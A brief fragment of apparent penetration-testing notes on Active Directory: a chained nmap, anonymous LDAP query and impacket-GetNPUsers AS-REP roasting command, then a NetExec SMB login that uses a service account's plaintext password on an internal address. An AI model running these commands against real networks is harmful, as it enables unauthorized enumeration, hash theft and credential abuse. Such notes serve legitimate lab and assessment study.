...
```shell
# Quick AD enumeration chain
nmap -Pn -sV $rhost && ldapsearch -x -H ldap://$rhost -b '' -s base && impacket-GetNPUsers $domain/ -usersfile users.txt -no-pass
```
...
```shell
nxc smb 172.16.87.202 -u svc_sql -p SQLPowerHouse333
```
